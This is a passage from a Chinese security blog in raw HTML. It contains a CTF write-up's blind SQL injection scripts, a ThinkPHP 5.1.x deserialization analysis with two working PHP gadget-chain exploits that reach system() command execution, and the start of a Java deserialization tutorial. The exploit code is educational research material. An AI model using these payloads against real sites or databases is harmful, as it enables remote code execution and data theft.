class="string">&#x27;cache-control&#x27;</span>: <span class="string">&quot;no-cache&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;Postman-Token&#x27;</span>: <span class="string">&quot;21b59b79-a818-4fd1-a908-3112b45f9fc6&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment"># 10.</span></span><br><span class="line">        <span class="comment"># response = requests.request(&quot;POST&quot;, url, data=&#123;</span></span><br><span class="line">        <span class="comment">#     &#x27;username&#x27;: &#x27;admin&quot;||(select/**/version())/**/regexp/**/0x&#x27; + binascii.hexlify(</span></span><br><span class="line">        <span class="comment">#         (&quot;^&quot; + result + i).encode()).decode() + &#x27;#&#x27;, &#x27;password&#x27;: &#x27;123456&#x27;&#125;, headers=headers)</span></span><br><span class="line">        <span class="comment"># ctf,f1ag,</span></span><br><span class="line">        <span class="comment"># response = requests.request(&quot;POST&quot;, url, data=&#123;</span></span><br><span class="line">        <span class="comment">#     &#x27;username&#x27;: &#x27;admin&quot;||(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats)/**/regexp/**/0x&#x27; + binascii.hexlify(</span></span><br><span class="line">        <span class="comment">#         (&quot;^&quot; + result + i).encode()).decode() + &#x27;#&#x27;,</span></span><br><span class="line">        <span class="comment">#     &#x27;password&#x27;: &#x27;123456&#x27;&#125;, headers=headers)</span></span><br><span class="line">        response = requests.request(<span class="string">&quot;POST&quot;</span>, url, data=&#123;<span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;admin&quot;||(select/**/*/**/from/**/f1ag)/**/regexp/**/0x&#x27;</span> + binascii.hexlify((<span class="string">&quot;^&quot;</span> + result + i).encode()).decode() + <span class="string">&#x27;#&#x27;</span>,</span><br><span class="line">                                                       <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;123456&#x27;</span>&#125;, headers=headers)</span><br><span class="line">        print(response.text)</span><br><span class="line">        <span class="keyword">if</span> response.text.find(<span class="string">&quot;home&quot;</span>) != -<span class="number">1</span>:</span><br><span class="line">            result += i</span><br><span class="line">            print(result)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>



<p>exp报错盲注脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">url = <span class="string">&quot;xxxxxxxx&quot;</span></span><br><span class="line">req = requests.session()</span><br><span class="line"></span><br><span class="line">string = [<span class="built_in">ord</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#x27;</span>]</span><br><span class="line"></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">chars = string.printable</span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">45</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> chars:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="comment">#  a&quot;||exp(make_set(strcmp((locate(binary&quot;%s&quot;,(select/**/database()),%d)),%d),710,1))#</span></span><br><span class="line">            </span><br><span class="line">        <span class="comment">#&#x27;username&#x27;:&#x27;a&quot;||exp(make_set(strcmp((locate(binary&quot;%s&quot;,(select/**/database()),%d)),%d),710,1))#&#x27;%(j,i,i), #数据库</span></span><br><span class="line">        <span class="comment"># &#x27;username&#x27;:&#x27;a&quot;||exp(make_set(strcmp((locate(binary&quot;%s&quot;,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/database_name/**/regexp/**/&quot;ctf&quot;),%d)),%d),710,1))#&#x27;%(j,i,i),#表</span></span><br><span class="line">         <span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;a&quot;||exp(make_set(strcmp((locate(binary&quot;%s&quot;,(select/**/group_concat(x.2)/**/from/**/(select/**/2/**/union/**/select/**/*/**/from/**/f1ag)x),%d)),%d),710,1))#&#x27;</span>%(j,i,i),</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;213&#x27;</span></span><br><span class="line">       &#125;   </span><br><span class="line">        rep =  req.post(url,data)</span><br><span class="line">        text = rep.text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;home.php&#x27;</span> <span class="keyword">in</span> text:</span><br><span class="line">            result += j</span><br><span class="line">            print(result)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">           </span><br></pre></td></tr></table></figure>



<p>参考：</p>
<p><a target="_blank" rel="noopener" href="http://www.yang99.top/index.php/archives/48/">http://www.yang99.top/index.php/archives/48/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.zhaoj.in/read-6859.html">https://www.zhaoj.in/read-6859.html</a></p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/E09ybDmvy-0gR44dT6_qmg">https://mp.weixin.qq.com/s/E09ybDmvy-0gR44dT6_qmg</a></p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-04-15T06:02:06.000Z" title="2021-04-15T06:02:06.000Z">2021-04-15</time>发表</span><span class="level-item"><time dateTime="2021-04-15T06:13:28.013Z" title="2021-04-15T06:13:28.013Z">2021-04-15</time>更新</span><span class="level-item">10 分钟读完 (大约1471个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/04/15/thinkphp-5-1-x-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-md/">thinkphp 5.1.x 反序列化漏洞分析.md</a></h1><div class="content"><h1 id="利用链1"><a href="#利用链1" class="headerlink" title="利用链1"></a>利用链1</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;thinkphp&#x2F;library&#x2F;think&#x2F;process&#x2F;pipes&#x2F;Windows.php</span><br></pre></td></tr></table></figure>

<p>存在<code>__destruct()</code>方法</p>
<p><img src="https://ae01.alicdn.com/kf/Ue153544e99674753b354a81fa2d37f22w.jpg"></p>
<p>跟进removeFiles()，file_exists在处理filename时会当成字符串处理，只要让构造<code>$this-&gt;files</code>为包含类的数组就可以调用<code>__toString()</code></p>
<p><img src="https://ae01.alicdn.com/kf/U8e3f924c78034285a8a1e3c82c79c3ce7.jpg"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;thinkphp&#x2F;library&#x2F;think&#x2F;model&#x2F;concern&#x2F;Conversion.php</span><br></pre></td></tr></table></figure>

<p>存在<code>_toString()</code></p>
<p><img src="https://ae01.alicdn.com/kf/U662f8ffb045e4216bf80f3a2ba789026B.jpg"></p>
<p><code>toJson()</code></p>
<p>调用<code>toArray()</code></p>
<p><img src="https://ae01.alicdn.com/kf/U461c285aba7b47d8b151dc337af9f213I.jpg"></p>
<p><code>toArray()</code></p>
<p>需要让<code>$this-&gt;visible</code>为空，<code>$this-&gt;hidden</code>为空，调用<code>getAttr()</code>。<code>$data</code>由<code>$this-&gt;data</code>和<code>$this-&gt;merge</code>合并而成。</p>
<p><img src="https://ae01.alicdn.com/kf/U0afb602c82f54d19999c9022498e7e718.jpg"></p>
<p><code>getAttr()</code>满足条件<code>isset($this-&gt;withAttr[$fieldName])</code>即可命令执行，参数可控</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$closure &#x3D; $this-&gt;withAttr[$fieldName];</span><br><span class="line">$value   &#x3D; $closure($value, $this-&gt;data);</span><br></pre></td></tr></table></figure>



<p><img src="https://ae01.alicdn.com/kf/U268db8f0b73d4aa996777ff2ce663d40V.jpg"></p>
<p><code>getData()</code>，需要满足第二个条件<code>$this-&gt;data</code>数组中存在<code>$name</code>键，即可返回<code>$this-&gt;data[$name]</code></p>
<p><img src="https://ae01.alicdn.com/kf/U814f07fd9107466a9da9c0e9dad752f4q.jpg"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;thinkphp&#x2F;library&#x2F;think&#x2F;Loader.php</span><br></pre></td></tr></table></figure>

<p><code>Loader::parseName</code></p>
<p>parseName会把大写字母转为小写并在前面加上_，如<code>A</code>变成<code>_a</code>，不影响payload的构造</p>
<p><img src="https://ae01.alicdn.com/kf/Uece731b7f26a4d57bdcf284ab22b2924Y.jpg"></p>
<p>函数名为<code>$closure = $this-&gt;withAttr[$fieldName];</code>，<code>$fieldName</code>来源于经过<code>Loader::parseName</code>函数处理的<code>getAttr()</code>函数参数<code>$name</code>，而<code>getAttr()</code>函数参数等于<code>$data</code>的键名<code>$key</code>，<code>$data</code>由<code>$this-&gt;data</code>和<code>$this-&gt;merge</code>合并而成。最终等于<code>$this-&gt;withAttr[$key]</code>。让数组<code>$this-&gt;withAttr</code>与<code>$this-&gt;data</code>有相同的键名即可</p>
<p>执行命令：<br><code>$value=$this-&gt;getData($name)</code>,<code>$name</code>为<code>getAttr()</code>参数，在<code>getData()</code>函数中只要满足<code>array_key_exists($name, $this-&gt;data</code>)就会返回<code>$this-&gt;data[$name]</code>，<code>$name</code>为传入参数等于键值$key，最终等于<code>$this-&gt;data[$key]</code>。</p>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>构造exp</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>&#123;</span><br><span class="line">    <span class="title">abstract</span> <span class="title">class</span> <span class="title">Model</span>&#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">withAttr</span> = [];</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$data</span> = [];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;withAttr=[<span class="string">&#x27;a&#x27;</span>=&gt;<span class="string">&#x27;system&#x27;</span>];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;data=[<span class="string">&#x27;a&#x27;</span>=&gt;<span class="string">&#x27;whoami&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span> &#123;</span><br><span class="line">    <span class="title">use</span> \<span class="title">think</span>\<span class="title">Model</span>\<span class="title">Pivot</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">think</span>\<span class="title">Process</span>;</span><br><span class="line">    <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Pipes</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Windows</span> <span class="keyword">extends</span> <span class="title">Pipes</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;files=[<span class="keyword">new</span> Pivot()];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize(<span class="keyword">new</span> Windows()));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://ae01.alicdn.com/kf/U60abe354ddfc4d3e8d3e92a008178e45f.jpg"></p>
<h1 id="利用链2"><a href="#利用链2" class="headerlink" title="利用链2"></a>利用链2</h1><p>前面的触发点都一样，区别在<code>toArray()</code>这里</p>
<p><code>toArray()</code></p>
<p>调用<code>_call()</code>方法，首先遍历数组<code>$this-&gt;append</code>，当键值<code>$name</code>为数组时满足<code>is_array($name)</code>。让<code>$relation</code>等于类名即可触发<code>_call()</code></p>
<p>在这之前按需要满足3个条件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.$this-&gt;append不为空</span><br><span class="line">2.is_array($name)</span><br><span class="line">让$this-&gt;append等于二维数组，$this-&gt;append&#x3D;[$key-&gt;数组]</span><br><span class="line">3.!$relation</span><br><span class="line">构造$this-&gt;append[&#39;aaa&#39;]和 $this-&gt;relation&#x3D;[&#39;mmm&#39;&#x3D;&gt;&#39;&#39;];即可</span><br></pre></td></tr></table></figure>

<p><img src="https://ae01.alicdn.com/kf/U459391197d914340af21fc63a2aa0558i.jpg"></p>
<p><code>getRelation()</code></p>
<p>满足<code>array_key_exists($name, $this-&gt;relation)</code>就会返回<code>$this-&gt;relation[$name]</code>。<code>$name</code>就是<code>$this-&gt;append</code>数组中的键名。需要让<code>$this-&gt;relation[$name]</code>等于空才能满足<code>!$relation</code>执行下面的语句。</p>
<p><img src="https://ae01.alicdn.com/kf/U031c17d448de4072ac1f1cb6d26c64a8e.jpg"></p>
<p><code>getAttr()</code>返回$value，也就是经过<code>getData()</code>处理的参数<code>$key</code></p>
<p><img src="https://ae01.alicdn.com/kf/U268db8f0b73d4aa996777ff2ce663d40V.jpg"></p>
<p><code>getData()</code>，<code>$name</code>就是<code>$this-&gt;append</code>数组中的键名<code>$key</code>，最终返回<code>$this-&gt;data[$name]</code>，让它等于一个存在<code>__call()</code>方法且不存在<code>visable()</code>方法的类即可调用<code>__call</code></p>
<p><img src="https://ae01.alicdn.com/kf/U7297b1d24af04ccab240da1344f9df3dC.jpg"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">thinkphp&#x2F;library&#x2F;think&#x2F;Request.php</span><br></pre></td></tr></table></figure>

<p><code>__call()</code>,由于<code>array_unshift()</code>会修改参数数组，造成执行命令不可控，所以没办法直接利用这个<code>call_user_func_array</code>,只能寻找新的利用点</p>
<p><img src="https://ae01.alicdn.com/kf/Ua63f68ce9d2748798f794fb759e8cdb9k.jpg"></p>
<p><code>filterValue()</code>函数中存在<code>call_user_func</code>，但是<code>$value</code>不可控，不能直接利用</p>
<p><img src="https://ae01.alicdn.com/kf/Ufdada4a625b04e4295940acc23fae4c8A.jpg"></p>
<p><code>input()</code>函数中调用了<code>filterValue()</code>，参数不可控不能直接利用</p>
<p><img src="https://ae01.alicdn.com/kf/U42a605b070ab4f9c918ffe6ce97d5ef4G.jpg"></p>
<p><code>param()</code>函数调用<code>input()</code>，执行<code>$this-&gt;input($this-&gt;param, $name, $default, $filter);</code>，参数仍不可控。</p>
<p><img src="https://ae01.alicdn.com/kf/U15cd63721be540628c8127f9ae2d8163D.jpg"></p>
<p><code>isAjax()</code>调用<code>param()</code>，参数<code>$this-&gt;config[&#39;var_ajax&#39;]</code>可控，这样<code>param()</code>函数中的<code>$name</code>参数可控，这样<code>input()</code>函数中的<code>$name</code>可控。<code>param()</code>函数可以接收<code>$_GET</code>数组赋值给<code>$this-&gt;param</code>，这样<code>input()</code>函数的前两个参数<code>$this-&gt;param</code>和<code>$name</code>都可控了</p>
<p><img src="https://ae01.alicdn.com/kf/Uadedd1ace0724bae913a1bc5ca99c814S.jpg"></p>
<p>回到<code>input()</code>函数，传入<code>filterValue()</code>函数的第一个参数<code>$data</code>和第三个<code>$filter</code>是执行命令的关键。$data等于<code>$this-&gt;getData($data,$name)</code>，两个函数参数就是<code>input()</code>传入的参数<code>$this-&gt;param</code>和<code>$name</code>。而<code>$filter</code>等于<code>$this-&gt;getFilter($filter, $default);</code></p>
<p><img src="https://ae01.alicdn.com/kf/U42a605b070ab4f9c918ffe6ce97d5ef4G.jpg"></p>
<p><code>getData()</code>,最终<code>$data</code> = <code>$data[$val]</code> = <code>$data[$name]</code>，也就是<code>$this-&gt;param[$this-&gt;config[&#39;var_ajax&#39;]]</code></p>
<p><img src="https://ae01.alicdn.com/kf/Uec06295fde6b4fa8978eb6e3f5847e39t.jpg"></p>
<p><code>getFilter()</code>，<code>$filter</code>来源于<code>$this-&gt;filter</code></p>
<p><img src="https://ae01.alicdn.com/kf/U2f4c13e776b44f79ba1ba227bc0063b3G.jpg"></p>
<h2 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h2><p>构造exp</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Request</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">hook</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$config</span> = [</span><br><span class="line">            <span class="comment">// 表单请求类型伪装变量</span></span><br><span class="line">            <span class="string">&#x27;var_method&#x27;</span>       =&gt; <span class="string">&#x27;_method&#x27;</span>,</span><br><span class="line">            <span class="comment">// 表单ajax伪装变量</span></span><br><span class="line">            <span class="string">&#x27;var_ajax&#x27;</span>         =&gt; <span class="string">&#x27;_ajax&#x27;</span>,</span><br><span class="line">            <span class="comment">// 表单pjax伪装变量</span></span><br><span class="line">            <span class="string">&#x27;var_pjax&#x27;</span>         =&gt; <span class="string">&#x27;_pjax&#x27;</span>,</span><br><span class="line">            <span class="comment">// PATHINFO变量名 用于兼容模式</span></span><br><span class="line">            <span class="string">&#x27;var_pathinfo&#x27;</span>     =&gt; <span class="string">&#x27;s&#x27;</span>,</span><br><span class="line">            <span class="comment">// 兼容PATH_INFO获取</span></span><br><span class="line">            <span class="string">&#x27;pathinfo_fetch&#x27;</span>   =&gt; [<span class="string">&#x27;ORIG_PATH_INFO&#x27;</span>, <span class="string">&#x27;REDIRECT_PATH_INFO&#x27;</span>, <span class="string">&#x27;REDIRECT_URL&#x27;</span>],</span><br><span class="line">            <span class="comment">// 默认全局过滤方法 用逗号分隔多个</span></span><br><span class="line">            <span class="string">&#x27;default_filter&#x27;</span>   =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="comment">// 域名根，如thinkphp.cn</span></span><br><span class="line">            <span class="string">&#x27;url_domain_root&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="comment">// HTTPS代理标识</span></span><br><span class="line">            <span class="string">&#x27;https_agent_name&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="comment">// IP代理获取标识</span></span><br><span class="line">            <span class="string">&#x27;http_agent_ip&#x27;</span>    =&gt; <span class="string">&#x27;HTTP_X_REAL_IP&#x27;</span>,</span><br><span class="line">            <span class="comment">// URL伪静态后缀</span></span><br><span class="line">            <span class="string">&#x27;url_html_suffix&#x27;</span>  =&gt; <span class="string">&#x27;html&#x27;</span>,</span><br><span class="line">        ];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$param</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$filter</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;hook=[<span class="string">&#x27;visible&#x27;</span>=&gt;[<span class="keyword">$this</span>,<span class="string">&#x27;isAjax&#x27;</span>]];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;config[<span class="string">&#x27;var_ajax&#x27;</span>]=<span class="string">&#x27;payload&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;param=[<span class="string">&#x27;payload&#x27;</span>=&gt;<span class="string">&#x27;whoami&#x27;</span>];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filter=[<span class="string">&#x27;system&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$append</span> = [];</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$relation</span> = [];</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$data</span> = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;append=[<span class="string">&#x27;mmm&#x27;</span>=&gt;[]];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;data=[<span class="string">&#x27;mmm&#x27;</span>=&gt;<span class="keyword">new</span> Request()];<span class="comment">//等于new Request</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;relation=[<span class="string">&#x27;mmm&#x27;</span>=&gt;<span class="string">&#x27;&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="title">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line">    <span class="comment">//use think\Process;</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Windows</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;files=[<span class="keyword">new</span> Pivot()];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize(<span class="keyword">new</span> Windows()));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p><img src="https://ae01.alicdn.com/kf/U4bbf06ed57dd48b48e13e1b84f31bffbz.jpg"></p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-04-12T05:09:24.000Z" title="2021-04-12T05:09:24.000Z">2021-04-12</time>发表</span><span class="level-item"><time dateTime="2021-04-12T05:09:51.021Z" title="2021-04-12T05:09:51.021Z">2021-04-12</time>更新</span><span class="level-item">11 分钟读完 (大约1608个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/04/12/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/">java反序列化学习</a></h1><div class="content"><h1 id="Serializeable"><a href="#Serializeable" class="headerlink" title="Serializeable"></a>Serializeable</h1><p>Seializeable是java实现序列化机制的工具，序列化数据包含对象类型和属性值。</p>
<p>Serializeable工具的简单说明</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">只需要实现Serializeable接口就可以进行对象的序列化处理</span><br><span class="line">序列化对象可以是基本数据类型、集合类或其他对象</span><br><span class="line">使用transient、static关键字修饰的属性不会被序列化</span><br><span class="line">父类不可序列化时，需要父类中存在无参构造函数。</span><br></pre></td></tr></table></figure>

<p>相关接口和类</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">java.io.Serializable</span><br><span class="line">java.io.Externalizable  &#x2F;&#x2F;该接口需要实现writeExternal和readExternal函数控制序列化</span><br><span class="line">ObjectOutput</span><br><span class="line">ObjectInput</span><br><span class="line">ObjectOutputStream</span><br><span class="line">ObjectInputStream</span><br></pre></td></tr></table></figure>

<p>序列化</p>
